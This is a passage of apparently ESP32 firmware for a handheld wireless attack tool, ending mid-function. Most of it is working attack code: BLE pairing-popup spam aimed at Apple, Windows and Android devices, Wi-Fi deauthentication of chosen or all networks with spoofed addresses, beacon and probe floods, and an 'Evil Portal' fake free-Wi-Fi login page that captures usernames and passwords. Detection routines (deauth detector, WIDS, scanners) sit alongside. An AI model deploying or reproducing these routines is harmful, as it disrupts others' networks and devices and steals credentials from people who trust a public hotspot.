void bleInitRadio() {
  stopRadios();
  if (!radio1Active && !radio.begin(&spiBus)) return;
  radio1Active = true;
  radio.setAutoAck(false); radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(4);
  radio.openWritingPipe(bleAA);
  radio.setChannel(2);
}
void bleSendPacket(int ch, uint8_t* mac, uint8_t* pdu, int len) {
  if (ch == 37) radio.setChannel(2);
  else if (ch == 38) radio.setChannel(26);
  else radio.setChannel(80);
  int pos = 0;
  blePkt[pos++] = 0xAA;
  memcpy(&blePkt[pos], bleAA, 4); pos += 4;
  blePkt[pos++] = (len & 0x3F) | 0x40;
  blePkt[pos++] = len;
  memcpy(&blePkt[pos], mac, 6); pos += 6;
  memcpy(&blePkt[pos], pdu, len); pos += len;
  uint32_t crc = bleCrc(&blePkt[5], pos - 5, 0x555555);
  blePkt[pos++] = crc & 0xFF;
  blePkt[pos++] = (crc >> 8) & 0xFF;
  blePkt[pos++] = (crc >> 16) & 0xFF;
  radio.writeFast(blePkt, pos);
  radio.txStandBy();
}

void runBLESpam() {
  displayInfo("BLE SPAM", "Init...");
  bleInitRadio();
  safeDelay(400);
  uint8_t mac[6], adv[31];
  int ch = 37;
  unsigned long last = 0, start = millis();
  unsigned long pktCount = 0;
  displayInfo("BLE SPAM", "Spamming...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 60) {
      bleRandomMac(mac);
      int advLen = 0;
      uint8_t name[20];
      bleRandomName(name, 15);
      int nlen = strlen((char*)name);
      adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
      adv[advLen++] = nlen + 1; adv[advLen++] = 0x09;
      memcpy(&adv[advLen], name, nlen); advLen += nlen;
      adv[advLen++] = 5; adv[advLen++] = 0xFF;
      for (int i = 0; i < 4; i++) adv[advLen++] = random(256);
      bleSendPacket(ch, mac, adv, advLen);
      ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
      last = millis();
      pktCount++;
      if (millis() - start > 1000) {
        display.clearDisplay();
        drawHeader("BLE SPAM");
        display.setCursor(0, 14); display.print("Pkts/s: "); display.print(pktCount);
        display.setCursor(0, 28); display.print("Total: "); display.print(millis() / 1000); display.print("s");
        display.display();
        pktCount = 0; start = millis();
      }
    }
    yield();
  }
  initRadios();
}

void runAppleJuice() {
  displayInfo("Sour Apple", "Broadcasting...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 0x1E; adv[advLen++] = 0xFF; adv[advLen++] = 0x4C; adv[advLen++] = 0x00;
    adv[advLen++] = 0x07; adv[advLen++] = 0x19; adv[advLen++] = 0x07;
    for (int i = 0; i < 22; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runSwiftPair() {
  displayInfo("Swift Pair", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 7; adv[advLen++] = 0xFF; adv[advLen++] = 0x06; adv[advLen++] = 0x00;
    adv[advLen++] = 0x03; adv[advLen++] = 0x00; adv[advLen++] = 0x80;
    for (int i = 0; i < 4; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runFastPair() {
  displayInfo("Fast Pair", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 14; adv[advLen++] = 0x16; adv[advLen++] = 0xFE; adv[advLen++] = 0x2C;
    adv[advLen++] = 0x00; adv[advLen++] = 0x00;
    for (int i = 0; i < 8; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runRickroll() {
  displayInfo("Rickroll", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  const uint8_t rickData[] = "Never gonna";
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 0x0C; adv[advLen++] = 0x09;
    memcpy(&adv[advLen], rickData, 11); advLen += 11;
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

void runBLEBadUSB() {
  displayInfo("BLE BadUSB", "Spamming...", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 11; adv[advLen++] = 0xFF; adv[advLen++] = 0x4C; adv[advLen++] = 0x00;
    adv[advLen++] = 0x0F; adv[advLen++] = 0x05;
    for (int i = 0; i < 6; i++) adv[advLen++] = random(256);
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(50); yield();
  }
  initRadios();
}

// ============================================================
// WIFI DEAUTH
// ============================================================
static bool deauthActive = false;
static uint8_t deauthBSSID[6];
static uint16_t deauthChannel = 0;
static bool deauthAll = false;

void deauthTask(void* pv) {
  uint8_t packet[26];
  memset(packet, 0, 26);
  packet[0] = 0xC0; packet[1] = 0x00;
  while (deauthActive) {
    if (deauthAll) {
      for (int ch = 1; ch <= 13 && deauthActive; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t spoofed[6];
        for (int i = 0; i < 6; i++) spoofed[i] = random(256);
        esp_wifi_set_mac(WIFI_IF_AP, spoofed);
        memcpy(packet + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(packet + 10, spoofed, 6);
        memcpy(packet + 16, spoofed, 6);
        for (int i = 0; i < 5; i++) { esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false); delay(4); }
      }
    } else {
      esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_mac(WIFI_IF_AP, deauthBSSID);
      memcpy(packet + 4, deauthBSSID, 6);
      memcpy(packet + 10, deauthBSSID, 6);
      memcpy(packet + 16, deauthBSSID, 6);
      for (int i = 0; i < 10; i++) { esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false); delay(1); }
    }
    yield();
  }
  vTaskDelete(NULL);
}
void startDeauthTask(bool all) {
  deauthActive = true; deauthAll = all;
  xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 1);
}
void stopDeauth() { deauthActive = false; safeDelay(100); }

void runWiFiDeauth() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks", "SEL to return");
    while (!selPressed()) yield();
    recoverFromWiFi(); return;
  }
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("Deauth Target");
    display.setCursor(0, 12); display.print("AP "); display.print(sel + 1); display.print("/"); display.print(n);
    display.setCursor(0, 24); display.println(WiFi.SSID(sel).substring(0, 20));
    display.setCursor(0, 36); display.print("Ch:"); display.print(WiFi.channel(sel));
    display.setCursor(0, 48); display.print("RSSI:"); display.print(WiFi.RSSI(sel));
    display.display();
    if (upPressed()) sel = (sel == 0) ? n - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % n;
    yield();
  }
  memcpy(deauthBSSID, WiFi.BSSID(sel), 6);
  deauthChannel = WiFi.channel(sel);
  displayInfo("Deauthing", WiFi.SSID(sel), "SEL to stop");
  startDeauthTask(false);
  while (!selPressed()) yield();
  stopDeauth();
  WiFi.scanDelete();
  recoverFromWiFi();
}

void runWiFiDeauthAll() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  displayInfo("Deauth ALL", "All channels", "SEL to stop");
  startDeauthTask(true);
  while (!selPressed()) yield();
  stopDeauth();
  recoverFromWiFi();
}

// ============================================================
// BEACON / PROBE FLOOD
// ============================================================
void runWiFiBeaconFlood() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  const char* fakes[] = {
    "FreeWiFi","Starbucks","McDonalds","AirportWiFi","HotelGuest",
    "PublicWiFi","AndroidAP","iPhone","HomeWiFi","OfficeWiFi",
    "Linksys","NETGEAR","TP-Link","Xfinity","Belkin"
  };
  const int num = 15;
  uint8_t pkt[128];
  int chan = 1;
  displayInfo("Beacon Flood", "SEL to stop");
  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;
    for (int i = 0; i < num; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++) spoofed[j] = random(256);
      esp_wifi_set_mac(WIFI_IF_AP, spoofed);
      memset(pkt, 0, 128);
      pkt[0] = 0x80; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, spoofed, 6);
      memcpy(pkt + 16, spoofed, 6);
      pkt[22] = random(256); pkt[23] = random(256);
      int pos = 24;
      memset(pkt + pos, 0, 8); pos += 8;
      pkt[pos++] = 0x64; pkt[pos++] = 0x00;
      pkt[pos++] = 0x21; pkt[pos++] = 0x04;
      pkt[pos++] = 0x00; pkt[pos++] = strlen(fakes[i]);
      memcpy(pkt + pos, fakes[i], strlen(fakes[i])); pos += strlen(fakes[i]);
      pkt[pos++] = 0x01; pkt[pos++] = 0x08;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(1); yield();
    }
  }
  recoverFromWiFi();
}

void runProbeFlood() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  const char* ssids[] = {"Home","Office","Free","Guest","Linksys","Cafe","Hotel","Shop"};
  uint8_t pkt[128];
  int chan = 1;
  displayInfo("Probe Flood", "SEL to stop");
  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;
    for (int i = 0; i < 8; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++) spoofed[j] = random(256);
      spoofed[0] &= 0xFE;
      memset(pkt, 0, 128);
      pkt[0] = 0x40; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, spoofed, 6);
      memcpy(pkt + 16, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      int pos = 24;
      pkt[pos++] = 0x00; pkt[pos++] = strlen(ssids[i]);
      memcpy(pkt + pos, ssids[i], strlen(ssids[i])); pos += strlen(ssids[i]);
      pkt[pos++] = 0x01; pkt[pos++] = 0x04;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(1); yield();
    }
  }
  recoverFromWiFi();
}

// ============================================================
// DEAUTH DETECT
// ============================================================
volatile uint32_t deauthDetectCount = 0;
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->payload[0] == 0xC0) deauthDetectCount++;
}

void runDeauthDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
  deauthDetectCount = 0;
  unsigned long lastCheck = millis();
  displayInfo("Deauth Detect", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck > 1000) {
      display.clearDisplay();
      drawHeader("Deauth Detect");
      display.setCursor(0, 14); display.print("Count: "); display.print(deauthDetectCount);
      display.setCursor(0, 28); display.print("Status: ");
      if (deauthDetectCount > 20) display.print("ATTACK!");
      else if (deauthDetectCount > 0) display.print("Suspicious");
      else display.print("Normal");
      display.display();
      deauthDetectCount = 0;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ============================================================
// WIDS
// ============================================================
#define MAX_APS 30
struct APInfo { uint8_t bssid[6]; String ssid; int rssi; uint32_t lastSeen; };
APInfo knownAPs[MAX_APS];
int knownAPCount = 0;
volatile uint32_t beaconCount = 0;
volatile uint32_t deauthCnt = 0;
volatile bool evilTwinAlert = false;
String evilTwinSSID = "";

void wids_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  uint8_t subtype = frame[0] & 0xFC;
  if (subtype == 0x80) {
    beaconCount++;
    uint8_t *bssid = frame + 10;
    int8_t rssi = pkt->rx_ctrl.rssi;
    String ssid = "";
    int pos = 36;
    while (pos < pkt->rx_ctrl.sig_len - 2) {
      uint8_t id = frame[pos];
      uint8_t len = frame[pos + 1];
      if (id == 0 && len > 0 && len < 32) {
        char tmp[33];
        memcpy(tmp, &frame[pos + 2], len); tmp[len] = 0;
        ssid = String(tmp); break;
      }
      pos += len + 2;
    }
    bool found = false;
    for (int i = 0; i < knownAPCount; i++) {
      if (memcmp(knownAPs[i].bssid, bssid, 6) == 0) {
        knownAPs[i].rssi = rssi; knownAPs[i].lastSeen = millis();
        found = true; break;
      }
    }
    if (!found && knownAPCount < MAX_APS) {
      memcpy(knownAPs[knownAPCount].bssid, bssid, 6);
      knownAPs[knownAPCount].ssid = ssid;
      knownAPs[knownAPCount].rssi = rssi;
      knownAPs[knownAPCount].lastSeen = millis();
      knownAPCount++;
    }
    for (int i = 0; i < knownAPCount; i++)
      for (int j = i + 1; j < knownAPCount; j++)
        if (knownAPs[i].ssid == knownAPs[j].ssid && knownAPs[i].ssid != "")
          if (memcmp(knownAPs[i].bssid, knownAPs[j].bssid, 6) != 0)
            if (abs(knownAPs[j].rssi - knownAPs[i].rssi) > 20) {
              evilTwinAlert = true;
              evilTwinSSID = knownAPs[i].ssid;
            }
  } else if (subtype == 0xC0) {
    deauthCnt++;
  }
}

void runWIDS() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wids_cb);
  beaconCount = 0; deauthCnt = 0; evilTwinAlert = false; knownAPCount = 0;
  unsigned long lastCheck = millis();
  displayInfo("WIDS Active", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck >= 1000) {
      display.clearDisplay();
      drawHeader("WIDS");
      display.setCursor(0, 14); display.print("B:"); display.print(beaconCount);
      display.print(" D:"); display.print(deauthCnt);
      display.setCursor(0, 28);
      if (beaconCount > 50) display.print("FLOOD!");
      else if (evilTwinAlert) { display.print("EVIL:"); display.print(evilTwinSSID.substring(0, 12)); }
      else if (deauthCnt > 15) display.print("DEAUTH!");
      else display.print("Normal");
      display.display();
      beaconCount = 0; deauthCnt = 0; evilTwinAlert = false;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ============================================================
// ROGUE AP DETECT
// ============================================================
void runRogueAPDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int sel = 0;
  int n = 0;
  unsigned long lastScan = 0;
  displayInfo("Rogue AP", "Scanning...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastScan > 5000) {
      n = WiFi.scanNetworks();
      lastScan = millis();
    }
    display.clearDisplay();
    drawHeader("Rogue AP Scan");
    display.setCursor(0, 11); display.print("Found: "); display.print(n);
    for (int i = 0; i < 4 && (sel + i) < n; i++) {
      int idx = sel + i;
      String ssid = WiFi.SSID(idx);
      if (ssid == "") ssid = "<hidden>";
      display.setCursor(0, 22 + i * 10);
      display.print(ssid.substring(0, 12));
      display.setCursor(96, 22 + i * 10);
      display.print(WiFi.RSSI(idx));
    }
    display.display();
    if (upPressed() && n > 0) sel = (sel == 0) ? n - 4 : sel - 1;
    if (downPressed() && n > 4) sel = (sel + 1) % (n - 3);
    yield();
  }
  WiFi.scanDelete();
  recoverFromWiFi();
}

// ============================================================
// NRF24 INJECTOR
// ============================================================
void runNRF24Injector() {
  displayInfo("NRF24 Injector", "Init...");
  initRadios();
  const uint64_t pipes[] = {0xE7E7E7E7E7LL, 0xC2C2C2C2C2LL, 0xDEADBEEF01LL, 0x4142434445LL};
  uint8_t payload[32];
  memset(payload, 0xAA, sizeof(payload));
  unsigned long last = 0;
  displayInfo("NRF24 Injector", "Broadcasting...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - last > 20) {
      if (radio1Active) {
        radio.setChannel(random(0, 100));
        radio.openWritingPipe(pipes[random(0, 4)]);
        radio.writeFast(payload, 32);
      }
      last = millis();
    }
    yield();
  }
  initRadios();
}

// ============================================================
// BLE SCANNER
// ============================================================
static BLEAdvertisedDevice* scannedDevices[20] = {nullptr};
static String bleNames[20], bleMacs[20];
static int bleRSSI[20], scanCount = 0;

class ScanCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (scanCount >= 20) return;
    scannedDevices[scanCount] = new BLEAdvertisedDevice(dev);
    bleNames[scanCount] = dev.haveName() ? dev.getName().c_str() : "Unknown";
    bleMacs[scanCount] = dev.getAddress().toString().c_str();
    bleRSSI[scanCount] = dev.getRSSI();
    scanCount++;
  }
};

void runBLEScanner() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  scanCount = 0;
  pScan->setAdvertisedDeviceCallbacks(new ScanCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99);
  displayInfo("BLE Scanner", "Scanning...");
  pScan->start(5, false);
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("BLE Scanner");
    if (scanCount == 0) {
      display.setCursor(0, 20); display.println("No devices");
    } else {
      int idx = sel % scanCount;
      display.setCursor(0, 14); display.print(idx + 1); display.print("/"); display.print(scanCount);
      display.setCursor(0, 26); display.println(bleNames[idx].substring(0, 20));
      display.setCursor(0, 38); display.println(bleMacs[idx]);
      display.setCursor(0, 50); display.print(bleRSSI[idx]); display.println(" dBm");
    }
    display.display();
    if (upPressed() && scanCount > 0) sel = (sel == 0) ? scanCount - 1 : sel - 1;
    if (downPressed() && scanCount > 0) sel = (sel + 1) % scanCount;
    yield();
  }
  for (int i = 0; i < scanCount; i++) delete scannedDevices[i];
  scanCount = 0;
  BLEDevice::deinit(true);
  initRadios();
}

// ============================================================
// BLE GATT EXPLORER
// ============================================================
void runBLEGATTExplorer() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  scanCount = 0;
  pScan->setAdvertisedDeviceCallbacks(new ScanCallbacks());
  pScan->setActiveScan(true);
  displayInfo("BLE GATT", "Scanning...");
  pScan->start(5, false);
  if (scanCount == 0) {
    displayInfo("No BLE device", "SEL to return");
    while (!selPressed()) yield();
    BLEDevice::deinit(true);
    initRadios(); return;
  }
  BLEAdvertisedDevice* dev = scannedDevices[0];
  displayInfo("Connecting", dev->getName().c_str());
  BLEClient* pClient = BLEDevice::createClient();
  if (pClient->connect(dev)) {
    displayInfo("Connected", "Services");
    std::map<std::string, BLERemoteService*>* services = pClient->getServices();
    int idx = 0;
    int svcCount = services->size();
    while (!selPressed()) {
      display.clearDisplay();
      drawHeader("GATT Services");
      int y = 12, count = 0;
      for (auto& svc : *services) {
        if (count == idx) { display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
        else display.setTextColor(SSD1306_WHITE);
        display.setCursor(2, y); display.print(String(svc.first.c_str()).substring(0, 20));
        y += 10;
        if (++count > 4) break;
      }
      display.display();
      if (upPressed()) idx = max(0, idx - 1);
      if (downPressed()) idx = min(svcCount - 1, idx + 1);
      yield();
    }
    pClient->disconnect();
  } else {
    displayInfo("Connect failed", "SEL to return");
    while (!selPressed()) yield();
  }
  BLEDevice::deinit(true);
  initRadios();
}

// ============================================================
// BLE TRACKER
// ============================================================
struct DevFingerprint { String name; int companyId; unsigned long lastSeen; String lastMac; };
std::vector<DevFingerprint> fingerprints;

class TrackerCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    String name = dev.haveName() ? dev.getName() : "";
    String mdata = dev.haveManufacturerData() ? dev.getManufacturerData() : "";
    int companyId = -1;
    if (mdata.length() >= 2) companyId = (uint8_t)mdata[0] | ((uint8_t)mdata[1] << 8);
    for (auto& fp : fingerprints) {
      if (fp.companyId == companyId && fp.name == name) {
        fp.lastSeen = millis();
        fp.lastMac = dev.getAddress().toString().c_str();
        return;
      }
    }
    DevFingerprint nf;
    nf.name = name; nf.companyId = companyId;
    nf.lastSeen = millis();
    nf.lastMac = dev.getAddress().toString().c_str();
    fingerprints.push_back(nf);
  }
};

void runBLETracker() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new TrackerCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99);
  fingerprints.clear();
  displayInfo("BLE Tracker", "Scanning...");
  pScan->start(0, nullptr, false);
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("BLE Tracker");
    display.setCursor(0, 12); display.print("Devices: "); display.print(fingerprints.size());
    int y = 24;
    for (int i = 0; i < min(3, (int)fingerprints.size()); i++) {
      String info = fingerprints[i].name + " [" + String(fingerprints[i].companyId, HEX) + "]";
      display.setCursor(0, y); display.print(info.substring(0, 22));
      y += 10;
    }
    display.display();
    safeDelay(1000);
    yield();
  }
  pScan->stop();
  BLEDevice::deinit(true);
  initRadios();
}

// ============================================================
// WIFI ANALYZER
// ============================================================
void runWiFiAnalyzer() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks", "SEL");
    while (!selPressed()) yield();
    recoverFromWiFi(); return;
  }
  int bestRSSI[14] = {0};
  String bestSSID[14];
  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13 && WiFi.RSSI(i) > bestRSSI[ch]) {
      bestRSSI[ch] = WiFi.RSSI(i);
      bestSSID[ch] = WiFi.SSID(i);
    }
  }
  display.clearDisplay();
  drawHeader("WiFi 1-13");
  for (int ch = 1; ch <= 13; ch++) {
    int barH = map(bestRSSI[ch], -100, -30, 0, 40);
    int x = map(ch, 1, 13, 5, 122);
    display.fillRect(x - 1, 52 - barH, 3, barH, SSD1306_WHITE);
    display.setCursor(x - 2, 56); display.print(ch % 10);
  }
  display.display();
  safeDelay(2500);
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("WiFi Analyzer");
    int ch = sel + 1;
    display.setCursor(0, 14); display.print("Ch:"); display.print(ch);
    display.setCursor(0, 26);
    if (bestRSSI[ch] != 0) {
      display.print(bestSSID[ch].substring(0, 18));
      display.setCursor(0, 38); display.print(bestRSSI[ch]); display.print(" dBm");
    } else display.print("empty");
    display.display();
    if (upPressed()) sel = (sel == 0) ? 12 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 13;
    yield();
  }
  WiFi.scanDelete();
  recoverFromWiFi();
}

// ============================================================
// WIFI SNIFFER / PACKET COUNTER / SIGNAL METER
// ============================================================
volatile uint32_t pktCount = 0;
int pktChannel = 1;
void pktCb(void* buf, wifi_promiscuous_pkt_type_t type) { pktCount++; }

void runPacketCounter() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pktCb);
  esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE);
  pktCount = 0;
  displayInfo("Packet Count", "Ch:" + String(pktChannel), "SEL to exit");
  while (!selPressed()) {
    if (upPressed()) { pktChannel = (pktChannel % 13) + 1; esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE); pktCount = 0; }
    if (downPressed()) { pktChannel = (pktChannel == 1) ? 13 : pktChannel - 1; esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE); pktCount = 0; }
    display.clearDisplay();
    drawHeader("Packet Count");
    display.setCursor(0, 16); display.print("Ch: "); display.print(pktChannel);
    display.setCursor(0, 32); display.print("Pkt: "); display.print(pktCount);
    display.display();
    safeDelay(400);
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runWiFiSniffer() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pktCb);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  pktCount = 0;
  int ch = 1;
  unsigned long lastHop = millis();
  displayInfo("WiFi Sniffer", "Hopping...", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastHop > 300) {
      ch = (ch % 13) + 1;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      lastHop = millis();
    }
    display.clearDisplay();
    drawHeader("WiFi Sniffer");
    display.setCursor(0, 16); display.print("Ch: "); display.print(ch);
    display.setCursor(0, 32); display.print("Pkts: "); display.print(pktCount);
    display.display();
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runSignalMeter() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  displayInfo("Signal Meter", "Scanning...");
  while (!selPressed()) {
    int n = WiFi.scanNetworks();
    display.clearDisplay();
    drawHeader("Signal Meter");
    for (int i = 0; i < min(n, 5); i++) {
      int rssi = WiFi.RSSI(i);
      int bars = map(rssi, -100, -30, 0, 20);
      display.setCursor(0, 12 + i * 10);
      display.print(WiFi.SSID(i).substring(0, 12));
      display.setCursor(80, 12 + i * 10);
      for (int b = 0; b < bars; b++) display.print("|");
    }
    display.display();
    WiFi.scanDelete();
    safeDelay(2000);
    yield();
  }
  recoverFromWiFi();
}

// ============================================================
// EVIL PORTAL
// ============================================================
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Free WiFi</title>
<style>body{font-family:Arial;text-align:center;margin-top:50px;}</style></head>
<body><h1>Free WiFi Login</h1>
<form action='/login' method='POST'>
<input name='user' placeholder='Username' style='padding:8px;margin:4px;'><br>
<input name='pass' type='password' placeholder='Password' style='padding:8px;margin:4px;'><br>
<input type='submit' value='Connect' style='padding:8px 24px;'>
</form></body></html>)rawliteral";

void runEvilPortal() {
  stopRadios();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free WiFi");
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.begin();
  capturedCredentials = "";
  displayInfo("Evil Portal", "AP: Free WiFi", "Waiting...");
  while (!selPressed()) {
    dnsServer.processNextRequest();
    WiFiClient client = webServer.available();
    if (client) {
      String request = client.readStringUntil('\r');
      client.flush();
      if (request.indexOf("POST /login") != -1) {
        String body = client.readString();
        int uIdx = body.indexOf("user=");
        int pIdx = body.indexOf("pass=");
        if (uIdx != -1 && pIdx != -1) {
          String user = body.substring(uIdx + 5, body.indexOf('&', uIdx));
          String pass = body.substring(pIdx + 5);
          pass.replace("+", " ");
          capturedCredentials = "U:" + user + " P:" + pass;
        }
        client.println("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<h1>Connected!</h1>");
      } else {
        client.print("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n");
        client.print(FPSTR(loginPage));
      }
      client.stop();
      if (capturedCredentials != "") displayInfo("Captured!", capturedCredentials, "SEL to exit");
    }
    yield();
  }
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  recoverFromWiFi();
}

// ============================================================
// RF REPEATER / REPLAY / MOUSE SNIFFER / OSCILLOSCOPE
// ============================================================
void runRFRepeater() {
  stopRadios();
  if (radio1Active) {
    radio.setAutoAck(false);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setAddressWidth(5);
    radio.openReadingPipe(0, 0xE7E7E7E7E7LL);
